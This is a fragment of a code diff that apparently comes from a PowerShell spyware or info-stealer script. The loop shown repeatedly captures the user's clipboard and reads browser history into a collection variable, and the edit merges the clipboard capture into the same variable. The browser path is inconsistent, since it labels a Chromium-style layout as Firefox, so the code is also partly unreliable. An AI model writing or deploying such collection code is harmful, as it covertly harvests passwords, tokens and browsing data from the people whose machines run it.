@@ -283,7 +283,7 @@ $Stopwatch.Start()
 
 while($true)
 { 
-    $clip += Get-Clipboard
+    $varper += Get-Clipboard
 
     if($Firenormal -eq $True) {
         $varper += cat -Path "Firefox/User Data/Default/History"
